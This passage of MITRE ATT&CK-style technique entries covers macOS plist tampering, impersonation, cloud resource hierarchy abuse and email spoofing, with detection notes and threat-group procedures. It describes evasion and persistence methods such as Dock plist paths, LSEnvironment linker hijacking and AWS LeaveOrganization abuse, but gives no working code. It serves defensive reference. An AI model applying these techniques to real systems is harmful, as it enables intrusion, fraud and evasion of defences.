+Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the info.plist file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format. Adversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e. Hidden Window) or running additional commands for persistence (ex: Launch Agent/Launch Daemon or Re-opened Applications). For example, adversaries can add a malicious application path to the `~/Library/Preferences/com.apple.dock.plist` file, which controls apps that appear in the Dock. Adversaries can also modify the LSUIElement key in an application’s info.plist file to run the app in the background. Adversaries can also insert key-value pairs to insert environment variables, such as LSEnvironment, to enable persistence via Dynamic Linker Hijacking.
+
+Detection:
+
+Monitor for common command-line editors used to modify plist files located in auto-run locations, such as \~/LaunchAgents, ~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm, and an application's Info.plist. Monitor for plist file modification immediately followed by code execution from \~/Library/Scripts and ~/Library/Preferences. Also, monitor for significant changes to any path pointers in a modified plist. Identify new services executed from plist modified in the previous user's session.
+
+Procedures:
+
+- [S1153] Cuckoo Stealer: Cuckoo Stealer can create and populate property list (plist) files to enable execution.
+- [S0658] XCSSET: In older versions, XCSSET uses the plutil command to modify the LSUIElement, DFBundleDisplayName, and CFBundleIdentifier keys in the /Contents/Info.plist file to change how XCSSET is visible on the system. In later versions, XCSSET leverages a third-party notarized `dockutil` tool to modify the `.plist` file responsible for presenting applications to the user in the Dock and LaunchPad to point to a malicious application.
+
+
+### T1656 - Impersonation
+
+Description:
+
+Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via Phishing for Information, Phishing, or Internal Spearphishing) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary’s ultimate goals, possibly against multiple victims. In many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables Financial Theft. Adversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary’s goal. Impersonation is typically preceded by reconnaissance techniques such as Gather Victim Identity Information and Gather Victim Org Information as well as acquiring infrastructure such as email domains (i.e. Domains) to substantiate their false identity. There is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may Compromise Accounts targeting one organization which can then be used to support impersonation against other entities.
+
+Procedures:
+
+- [G1046] Storm-1811: Storm-1811 impersonates help desk and IT support personnel for phishing and social engineering purposes during initial access to victim environments.
+- [G1004] LAPSUS$: LAPSUS$ has called victims' help desk and impersonated legitimate users with previously gathered information in order to gain access to privileged accounts.
+- [G1031] Saint Bear: Saint Bear has impersonated government and related entities in both phishing activity and developing web sites with malicious links that mimic legitimate resources.
+- [G1044] APT42: APT42 has impersonated legitimate people in phishing emails to gain credentials.
+- [C0022] Operation Dream Job: During Operation Dream Job, Lazarus Group impersonated HR hiring personnel through LinkedIn messages and conducted interviews with victims in order to deceive them into downloading malware.
+- [G0094] Kimsuky: Kimsuky has impersonated academic institutions and NGOs in order to gain information related to North Korea.
+- [C0027] C0027: During C0027, Scattered Spider impersonated legitimate IT personnel in phone calls and text messages either to direct victims to a credential harvesting site or getting victims to run commercial remote monitoring and management (RMM) tools.
+- [G0096] APT41: APT41 impersonated an employee at a video game developer company to send phishing emails.
+- [S1131] NPPSPY: NPPSPY creates a network listener using the misspelled label logincontroll recorded to the Registry key HKLM\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order.
+- [G1015] Scattered Spider: During C0027, Scattered Spider impersonated legitimate IT personnel in phone calls and text messages either to direct victims to a credential harvesting site or getting victims to run commercial remote monitoring and management (RMM) tools. Scattered Spider utilized social engineering to compel IT help desk personnel to reset passwords and MFA tokens.
+
+
+### T1666 - Modify Cloud Resource Hierarchy
+
+Description:
+
+Adversaries may attempt to modify hierarchical structures in infrastructure-as-a-service (IaaS) environments in order to evade defenses. IaaS environments often group resources into a hierarchy, enabling improved resource management and application of policies to relevant groups. Hierarchical structures differ among cloud providers. For example, in AWS environments, multiple accounts can be grouped under a single organization, while in Azure environments, multiple subscriptions can be grouped under a single management group. Adversaries may add, delete, or otherwise modify resource groups within an IaaS hierarchy. For example, in Azure environments, an adversary who has gained access to a Global Administrator account may create new subscriptions in which to deploy resources. They may also engage in subscription hijacking by transferring an existing pay-as-you-go subscription from a victim tenant to an adversary-controlled tenant. This will allow the adversary to use the victim’s compute resources without generating logs on the victim tenant. In AWS environments, adversaries with appropriate permissions in a given account may call the `LeaveOrganization` API, causing the account to be severed from the AWS Organization to which it was tied and removing any Service Control Policies, guardrails, or restrictions imposed upon it by its former Organization. Alternatively, adversaries may call the `CreateAccount` API in order to create a new account within an AWS Organization. This account will use the same payment methods registered to the payment account but may not be subject to existing detections or Service Control Policies.
+
+
+### T1672 - Email Spoofing
+
+Description:
+
+Adversaries may fake, or spoof, a sender’s identity by modifying the value of relevant email headers in order to establish contact with victims under false pretenses. In addition to actual email content, email headers (such as the FROM header, which contains the email address of the sender) may also be modified. Email clients display these headers when emails appear in a victim's inbox, which may cause modified emails to appear as if they were from the spoofed entity. This behavior may succeed when the spoofed entity either does not enable or enforce identity authentication tools such as Sender Policy Framework (SPF), DomainKeys Identified Mail (DKIM), and/or Domain-based Message Authentication, Reporting and Conformance (DMARC). Even if SPF and DKIM are configured properly, spoofing may still succeed when a domain sets a weak DMARC policy such as `v=DMARC1; p=none; fo=1;`. This means that while DMARC is technically present, email servers are not instructed to take any filtering action when emails fail authentication checks. Adversaries may abuse absent or weakly configured SPF, SKIM, and/or DMARC policies to conceal social engineering attempts such as Phishing. They may also leverage email spoofing for Impersonation of legitimate external individuals and organizations, such as journalists and academics.
+
